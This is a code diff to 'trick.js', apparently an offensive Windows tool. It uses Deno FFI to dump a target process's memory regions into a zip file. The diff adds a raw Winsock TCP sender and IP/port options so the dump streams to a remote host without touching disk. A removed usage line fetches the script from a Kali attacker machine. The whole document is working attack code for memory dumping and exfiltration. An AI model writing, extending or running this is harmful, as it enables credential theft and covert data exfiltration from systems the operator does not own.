@@ -1,8 +1,7 @@
-#!/usr/bin/env -S deno run --allow-ffi --allow-write
+#!/usr/bin/env -S deno run --allow-ffi --allow-write --allow-net
 // trick.js — Deno port of trick.py + overwrite.py
 // Usage:
-//   deno run --allow-ffi --allow-write http://KALI:PORT/trick.js
-//   deno run --allow-ffi --allow-write trick.js [-o disk|knowndlls|debugproc] [-p path]
+//   deno run --allow-ffi --allow-write --allow-net trick.js [-o disk|knowndlls|debugproc] [-p path] [-i IP] [-P port]
 
 // ═══════════════════════════════════════
 // Constants
@@ -517,7 +516,7 @@ async function buildZip(entries) {
   return out;
 }
 
-async function createZipFile(lockJson, shockJson, barrelJson, filesContent) {
+async function createZipData(lockJson, shockJson, barrelJson, filesContent) {
   const innerZip = await buildZip(filesContent.map((f) => ({ name: f.filename, data: f.content })));
   const te = new TextEncoder();
   const outerZip = await buildZip([
@@ -526,17 +525,69 @@ async function createZipFile(lockJson, shockJson, barrelJson, filesContent) {
     { name: "barrel.json", data: te.encode(barrelJson) },
     { name: "barrel.zip", data: innerZip },
   ]);
-  Deno.writeFileSync("trick.zip", outerZip);
+  return outerZip;
+}
+
+// ══════════════════════════════
+// FFI — ws2_32.dll (TCP send)
+// ══════════════════════════════
+const ws2 = Deno.dlopen("ws2_32.dll", {
+  WSAStartup: { parameters: ["u16", "buffer"], result: "i32" },
+  socket: { parameters: ["i32", "i32", "i32"], result: "usize" },
+  connect: { parameters: ["usize", "buffer", "i32"], result: "i32" },
+  send: { parameters: ["usize", "buffer", "i32", "i32"], result: "i32" },
+  closesocket: { parameters: ["usize"], result: "i32" },
+  WSACleanup: { parameters: [], result: "i32" },
+});
+
+function sendTcp(ip, port, data) {
+  const wsaData = new Uint8Array(408);
+  if (ws2.symbols.WSAStartup(0x0202, wsaData) !== 0) {
+    console.log("[-] WSAStartup failed");
+    return false;
+  }
+  const sock = ws2.symbols.socket(2, 1, 6);
+  if (sock === 0xFFFFFFFFFFFFFFFFn || sock === 0xFFFFFFFF) {
+    console.log("[-] socket() failed");
+    ws2.symbols.WSACleanup();
+    return false;
+  }
+  const parts = ip.split(".").map(Number);
+  const sa = new Uint8Array(16);
+  sa[0] = 2; // AF_INET
+  sa[2] = (port >> 8) & 0xff;
+  sa[3] = port & 0xff;
+  sa[4] = parts[0]; sa[5] = parts[1]; sa[6] = parts[2]; sa[7] = parts[3];
+  if (ws2.symbols.connect(sock, sa, 16) !== 0) {
+    console.log("[-] connect() failed");
+    ws2.symbols.closesocket(sock);
+    ws2.symbols.WSACleanup();
+    return false;
+  }
+  console.log("[+] Connected to " + ip + ":" + port);
+  let offset = 0;
+  while (offset < data.length) {
+    const chunk = Math.min(data.length - offset, 65536);
+    const sent = ws2.symbols.send(sock, data.subarray(offset, offset + chunk), chunk, 0);
+    if (sent <= 0) { console.log("[-] send() failed"); break; }
+    offset += sent;
+  }
+  console.log("[+] Sent " + offset + " bytes");
+  ws2.symbols.closesocket(sock);
+  ws2.symbols.WSACleanup();
+  return true;
 }
 
 // ══════════════════════════════
 // CLI args
 // ══════════════════════════════
 function parseArgs() {
-  const args = { option: null, path: null };
+  const args = { option: null, path: null, ip: null, port: 0 };
   for (let i = 0; i < Deno.args.length; i++) {
     if (Deno.args[i] === "-o" || Deno.args[i] === "--option") args.option = Deno.args[++i];
     else if (Deno.args[i] === "-p" || Deno.args[i] === "--path") args.path = Deno.args[++i];
+    else if (Deno.args[i] === "-i" || Deno.args[i] === "--ip") args.ip = Deno.args[++i];
+    else if (Deno.args[i] === "-P" || Deno.args[i] === "--port") args.port = parseInt(Deno.args[++i]);
   }
   return args;
 }
@@ -571,13 +622,20 @@ async function main() {
   const [barrelData, filesContent] = barrel(hProc);
   console.log("[+] barrel() done - " + barrelData.length + " memory regions");
 
-  await createZipFile(
+  const zipData = await createZipData(
     JSON.stringify(lockData),
     JSON.stringify(shockData),
     JSON.stringify(barrelData),
     filesContent
   );
-  console.log("[+] File trick.zip created successfully");
+
+  if (args.ip && args.port > 0) {
+    console.log("[+] Sending trick.zip to " + args.ip + ":" + args.port + " (" + zipData.length + " bytes)");
+    sendTcp(args.ip, args.port, zipData);
+  } else {
+    Deno.writeFileSync("trick.zip", zipData);
+    console.log("[+] File trick.zip created successfully");
+  }
 }
 
 await main();
